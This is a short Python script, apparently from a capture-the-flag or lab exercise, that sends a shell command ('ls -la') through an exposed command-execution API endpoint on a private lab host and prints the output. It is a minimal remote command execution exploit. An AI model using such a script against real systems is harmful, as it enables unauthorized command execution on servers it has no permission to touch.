import requests

URL = "http://10.10.222.245:3000/api/cmd/{}"
payload = "ls -la"

response = requests.get(URL.format(payload))
items = response.json()['stdout']
print(items)
